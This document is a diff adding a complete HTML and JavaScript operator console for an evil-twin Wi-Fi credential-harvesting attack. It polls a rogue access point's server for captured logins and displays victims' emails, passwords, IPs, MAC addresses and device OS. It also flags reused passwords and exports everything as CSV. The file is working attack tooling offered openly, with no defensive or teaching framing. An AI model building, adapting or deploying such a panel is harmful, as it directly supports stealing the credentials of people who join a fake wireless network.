@@ -1,0 +1,292 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>harvest // capture console</title>
+<style>
+  :root{
+    --bg:#04070a; --panel:#080e0c; --line:#0d3b2b; --line2:#0a5f43;
+    --grn:#00ff9c; --grn-dim:#1c8f6a; --amber:#ffb000; --red:#ff4d5e;
+    --cyan:#39d0ff; --muted:#4f7a6b; --text:#c7ffe9;
+    --glow:0 0 6px rgba(0,255,156,.55);
+  }
+  *{ box-sizing:border-box; }
+  html,body{ margin:0; }
+  body{
+    background:
+      radial-gradient(1200px 700px at 50% -20%, #06120d 0%, var(--bg) 60%),
+      var(--bg);
+    color:var(--text);
+    font:13.5px/1.55 ui-monospace,"JetBrains Mono","Fira Code","SF Mono",Menlo,Consolas,monospace;
+    padding:18px; height:100vh; overflow:hidden; display:flex; flex-direction:column;
+  }
+  /* scanlines + flicker */
+  body::before{
+    content:""; position:fixed; inset:0; pointer-events:none; z-index:9;
+    background:repeating-linear-gradient(0deg, rgba(0,0,0,0) 0 2px, rgba(0,20,12,.35) 2px 3px);
+    mix-blend-mode:overlay; opacity:.5;
+  }
+  a{ color:var(--cyan); }
+  .glow{ text-shadow:var(--glow); }
+  .cursor{ display:inline-block; width:9px; height:16px; background:var(--grn);
+           box-shadow:var(--glow); animation:blink 1s steps(1) infinite; vertical-align:-2px; }
+  @keyframes blink{ 50%{ opacity:0; } }
+
+  /* header */
+  header{ border:1px solid var(--line2); border-radius:10px; padding:12px 16px;
+    background:linear-gradient(180deg, rgba(0,255,156,.05), transparent);
+    display:flex; align-items:center; gap:14px; flex-wrap:wrap; margin-bottom:16px; }
+  .prompt{ font-size:15px; color:var(--grn); text-shadow:var(--glow); white-space:nowrap; }
+  .prompt .u{ color:var(--cyan); } .prompt .p{ color:var(--muted); }
+  .spacer{ flex:1; }
+  .stat-live{ display:flex; align-items:center; gap:7px; font-size:12px; color:var(--grn); }
+  .beacon{ width:8px; height:8px; border-radius:50%; background:var(--grn);
+    box-shadow:0 0 8px var(--grn); animation:pulse 1.4s ease-in-out infinite; }
+  .beacon.off{ background:var(--red); box-shadow:0 0 8px var(--red); }
+  @keyframes pulse{ 50%{ opacity:.35; transform:scale(.7);} }
+  .clock{ color:var(--muted); font-size:12px; }
+
+  /* stat tiles */
+  .tiles{ display:grid; grid-template-columns:repeat(4,1fr); gap:12px; margin-bottom:16px; }
+  @media(max-width:720px){ .tiles{ grid-template-columns:repeat(2,1fr);} }
+  .tile{ border:1px solid var(--line); border-radius:10px; padding:12px 14px;
+    background:var(--panel); position:relative; overflow:hidden; }
+  .tile .lbl{ font-size:10.5px; letter-spacing:.14em; color:var(--muted); text-transform:uppercase; }
+  .tile .num{ font-size:30px; font-weight:700; color:var(--grn); text-shadow:var(--glow); line-height:1.2; }
+  .tile.warn .num{ color:var(--amber); text-shadow:0 0 6px rgba(255,176,0,.5); }
+  .tile .sub{ font-size:11px; color:var(--muted); }
+
+  /* controls */
+  .bar{ display:flex; gap:10px; align-items:center; margin-bottom:12px; flex-wrap:wrap; }
+  .search{ flex:1; min-width:200px; display:flex; align-items:center; gap:8px;
+    border:1px solid var(--line); border-radius:9px; padding:8px 12px; background:var(--panel); }
+  .search span{ color:var(--grn); }
+  .search input{ flex:1; background:transparent; border:0; outline:none; color:var(--text);
+    font:inherit; }
+  .search input::placeholder{ color:var(--muted); }
+  button{ background:#07120d; color:var(--grn); border:1px solid var(--line2);
+    border-radius:9px; padding:8px 14px; cursor:pointer; font:inherit; text-shadow:var(--glow); }
+  button:hover{ background:rgba(0,255,156,.08); }
+  button.red{ color:var(--red); border-color:#5a1620; text-shadow:0 0 6px rgba(255,77,94,.4); }
+
+  /* layout */
+  .grid{ display:grid; grid-template-columns:1fr; gap:16px; flex:1 1 auto; min-height:0; }
+  @media(min-width:1000px){ .grid{ grid-template-columns:300px 1fr; } }
+  header,.tiles,.bar{ flex:none; }
+  .grid > div{ min-height:0; overflow-y:auto; }
+  .grid > .panel{ display:flex; flex-direction:column; min-height:0; }
+  .panel{ border:1px solid var(--line); border-radius:10px; background:var(--panel); }
+  .panel h2{ font-size:11px; letter-spacing:.12em; text-transform:uppercase; color:var(--grn);
+    margin:0; padding:11px 14px; border-bottom:1px solid var(--line); text-shadow:var(--glow); }
+  .panel .body{ padding:6px 14px 12px; }
+
+  /* connected clients + os breakdown */
+  .cli{ display:flex; justify-content:space-between; gap:8px; padding:8px 0;
+    border-bottom:1px dashed var(--line); font-size:12.5px; }
+  .cli:last-child{ border-bottom:0; }
+  .cli .mac{ color:var(--muted); font-size:11px; }
+  .cli .ip{ color:var(--cyan); }
+  .osrow{ display:flex; align-items:center; gap:8px; margin:7px 0; font-size:12px; }
+  .osrow .name{ width:74px; color:var(--muted); }
+  .osrow .track{ flex:1; height:8px; background:#06170f; border:1px solid var(--line); border-radius:5px; overflow:hidden; }
+  .osrow .fill{ height:100%; background:linear-gradient(90deg,var(--grn-dim),var(--grn)); box-shadow:var(--glow); }
+  .osrow .n{ width:22px; text-align:right; color:var(--grn); }
+
+  /* feed */
+  .feed{ display:flex; flex-direction:column; flex:1; min-height:0; overflow-y:auto; }
+  .entry{ padding:12px 14px; border-bottom:1px solid var(--line); }
+  .entry:last-child{ border-bottom:0; }
+  .entry.new{ animation:land 1.6s ease-out; }
+  @keyframes land{ from{ background:rgba(0,255,156,.14);} to{ background:transparent; } }
+  .meta{ display:flex; align-items:center; gap:10px; flex-wrap:wrap; margin-bottom:7px; }
+  .idx{ color:var(--grn-dim); }
+  .os{ border:1px solid var(--line2); border-radius:6px; padding:1px 8px; font-size:11px; color:var(--cyan); }
+  .host{ color:var(--text); }
+  .mac,.ip{ color:var(--muted); font-size:11.5px; }
+  .ip b{ color:var(--cyan); font-weight:400; }
+  .ago{ margin-left:auto; color:var(--muted); font-size:11px; }
+  .reused{ color:var(--amber); border:1px solid #6b4a00; border-radius:6px; padding:1px 7px;
+    font-size:10.5px; text-shadow:0 0 6px rgba(255,176,0,.5); }
+  .kv{ display:grid; grid-template-columns:max-content 1fr; gap:2px 12px; font-size:13px;
+    margin-top:2px; }
+  .kv .k{ color:var(--muted); } .kv .k::after{ content:":"; }
+  .kv .v{ color:var(--text); word-break:break-all; }
+  .kv .v.pw{ color:var(--red); text-shadow:0 0 6px rgba(255,77,94,.45); font-weight:600; }
+  .kv .v.em{ color:var(--grn); }
+  .empty{ color:var(--muted); padding:34px 14px; text-align:center; }
+  .empty .c{ color:var(--grn); }
+  ::selection{ background:rgba(0,255,156,.3); }
+</style>
+</head>
+<body>
+  <header>
+    <div class="prompt"><span class="u">root</span><span class="p">@</span>evil-twin<span class="p">:~#</span> ./harvest --watch<span class="cursor"></span></div>
+    <div class="spacer"></div>
+    <div class="stat-live"><span class="beacon" id="beacon"></span><span id="status">ONLINE</span></div>
+    <div class="clock" id="clock">--:--:--</div>
+  </header>
+
+  <div class="tiles">
+    <div class="tile"><div class="lbl">Captures</div><div class="num" id="tCap">0</div><div class="sub" id="tCapSub">credential sets</div></div>
+    <div class="tile"><div class="lbl">Devices hooked</div><div class="num" id="tDev">0</div><div class="sub" id="tDevSub">unique MACs</div></div>
+    <div class="tile"><div class="lbl">Clients on AP</div><div class="num" id="tCli">0</div><div class="sub">live DHCP leases</div></div>
+    <div class="tile warn"><div class="lbl">Reused passwords</div><div class="num" id="tReuse">0</div><div class="sub" id="tReuseSub">credential reuse</div></div>
+  </div>
+
+  <div class="bar">
+    <div class="search"><span>&gt;</span><input id="q" placeholder="filter  (email, password, ip, mac, host, os…)   press /"></div>
+    <button id="export">⬇ export csv</button>
+    <button class="red" id="clear">✖ wipe</button>
+  </div>
+
+  <div class="grid">
+    <div>
+      <div class="panel" style="margin-bottom:16px">
+        <h2>▍connected clients</h2>
+        <div class="body" id="clients"><div class="empty">no leases</div></div>
+      </div>
+      <div class="panel">
+        <h2>▍os breakdown</h2>
+        <div class="body" id="osbreak"><div class="empty">—</div></div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <h2>▍harvested credentials — live feed</h2>
+      <div class="feed" id="feed"><div class="empty">waiting for first catch<span class="c">_</span></div></div>
+    </div>
+  </div>
+
+<script>
+  const token = new URLSearchParams(location.search).get("token");
+  const q = token ? "?token=" + encodeURIComponent(token) : "";
+  const $ = id => document.getElementById(id);
+  const esc = s => (s ?? "").toString().replace(/[&<>"]/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;" }[c]));
+  let lastCount = 0, allCaps = [];
+
+  const detectOS = ua => {
+    ua = ua || "";
+    if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
+    if (/Android/.test(ua)) return "Android";
+    if (/Windows/.test(ua)) return "Windows";
+    if (/Mac OS X|Macintosh/.test(ua)) return "macOS";
+    if (/Linux|X11/.test(ua)) return "Linux";
+    return "unknown";
+  };
+  const isPw = k => /pass|pwd|pin/i.test(k);
+  const isEmail = k => /mail|user|login|phone/i.test(k);
+  const getPw = f => { for (const k in (f||{})) if (isPw(k)) return f[k]; return null; };
+
+  const ago = ts => {
+    const s = Math.max(0, (Date.now() - new Date(ts).getTime()) / 1000);
+    if (s < 60) return Math.floor(s) + "s ago";
+    if (s < 3600) return Math.floor(s/60) + "m ago";
+    return Math.floor(s/3600) + "h ago";
+  };
+
+  function render() {
+    const term = $("q").value.trim().toLowerCase();
+
+    // reuse map (over ALL captures, not just filtered)
+    const pwCount = {};
+    allCaps.forEach(r => { const p = getPw(r.fields); if (p) pwCount[p] = (pwCount[p]||0)+1; });
+    const reusedPw = new Set(Object.entries(pwCount).filter(([,n]) => n > 1).map(([p]) => p));
+
+    // tiles
+    $("tCap").textContent = allCaps.length;
+    const devs = new Set(allCaps.map(r => r.mac).filter(Boolean));
+    $("tDev").textContent = devs.size;
+    $("tReuse").textContent = reusedPw.size;
+    $("tReuseSub").textContent = reusedPw.size ? "⚠ weak — shared secrets" : "none detected";
+
+    // filter
+    let caps = allCaps.slice().reverse();
+    if (term) caps = caps.filter(r => {
+      const hay = [r.ip, r.mac, r.hostname, detectOS(r.user_agent),
+                   ...Object.entries(r.fields||{}).flat()].join(" ").toLowerCase();
+      return hay.includes(term);
+    });
+
+    // feed
+    $("feed").innerHTML = caps.length ? caps.map((r, i) => {
+      const os = detectOS(r.user_agent);
+      const isNew = allCaps.length > lastCount && i === 0 && !term;
+      const pw = getPw(r.fields);
+      const kv = Object.entries(r.fields || {}).map(([k, v]) =>
+        `<div class="k">${esc(k)}</div><div class="v ${isPw(k)?'pw':(isEmail(k)?'em':'')}">${esc(v)}</div>`).join("");
+      return `<div class="entry ${isNew?'new':''}">
+        <div class="meta">
+          <span class="idx">#${String(allCaps.length - allCaps.indexOf(r)).padStart(3,'0')}</span>
+          <span class="os">${esc(os)}</span>
+          <span class="host">${esc(r.hostname || "unknown-device")}</span>
+          <span class="mac">${esc(r.mac || "??:??:??")}</span>
+          <span class="ip">· <b>${esc(r.ip)}</b></span>
+          ${pw && reusedPw.has(pw) ? '<span class="reused">⚠ REUSED</span>' : ''}
+          <span class="ago">${esc(ago(r.ts))}</span>
+        </div>
+        <div class="kv">${kv}</div>
+      </div>`;
+    }).join("") : `<div class="empty">${term ? "no matches" : 'waiting for first catch'}<span class="c">_</span></div>`;
+    lastCount = allCaps.length;
+  }
+
+  function renderSide(clients) {
+    $("tCli").textContent = clients.length;
+    $("clients").innerHTML = clients.length ? clients.map(c =>
+      `<div class="cli"><span>${esc(c.hostname || "device")}<br><span class="mac">${esc(c.mac)}</span></span>
+       <span class="ip">${esc(c.ip)}</span></div>`).join("") : `<div class="empty">no leases</div>`;
+
+    // os breakdown across captures
+    const counts = {};
+    allCaps.forEach(r => { const o = detectOS(r.user_agent); counts[o] = (counts[o]||0)+1; });
+    const entries = Object.entries(counts).sort((a,b) => b[1]-a[1]);
+    const max = Math.max(1, ...entries.map(e => e[1]));
+    $("osbreak").innerHTML = entries.length ? entries.map(([o,n]) =>
+      `<div class="osrow"><span class="name">${esc(o)}</span>
+        <span class="track"><span class="fill" style="width:${(n/max*100).toFixed(0)}%"></span></span>
+        <span class="n">${n}</span></div>`).join("") : `<div class="empty">—</div>`;
+  }
+
+  async function tick() {
+    try {
+      const d = await (await fetch("/admin/data.json" + q, { cache: "no-store" })).json();
+      $("beacon").className = "beacon"; $("status").textContent = "ONLINE";
+      allCaps = d.captures || [];
+      render();
+      renderSide(d.clients || []);
+    } catch (e) {
+      $("beacon").className = "beacon off"; $("status").textContent = "LINK LOST";
+    }
+  }
+
+  function exportCSV() {
+    if (!allCaps.length) return;
+    const keys = [...new Set(allCaps.flatMap(r => Object.keys(r.fields || {})))];
+    const cols = ["ts","os","hostname","mac","ip", ...keys];
+    const cell = s => `"${(s ?? "").toString().replace(/"/g,'""')}"`;
+    const lines = [cols.join(",")].concat(allCaps.map(r =>
+      [r.ts, detectOS(r.user_agent), r.hostname, r.mac, r.ip, ...keys.map(k => (r.fields||{})[k])].map(cell).join(",")));
+    const url = URL.createObjectURL(new Blob([lines.join("\n")], { type: "text/csv" }));
+    const a = document.createElement("a");
+    a.href = url; a.download = "harvest-" + new Date().toISOString().slice(0,19).replace(/[:T]/g,"") + ".csv";
+    a.click(); URL.revokeObjectURL(url);
+  }
+
+  $("export").onclick = exportCSV;
+  $("clear").onclick = async () => {
+    if (!confirm("Wipe all harvested credentials? This cannot be undone.")) return;
+    await fetch("/admin/clear" + q, { method: "POST" });
+    lastCount = 0; tick();
+  };
+  $("q").oninput = render;
+  document.addEventListener("keydown", e => {
+    if (e.key === "/" && document.activeElement !== $("q")) { e.preventDefault(); $("q").focus(); }
+  });
+  setInterval(() => { $("clock").textContent = new Date().toLocaleTimeString(); render(); }, 1000);
+  $("clock").textContent = new Date().toLocaleTimeString();
+  tick();
+  setInterval(tick, 2000);
+</script>
+</body>
+</html>
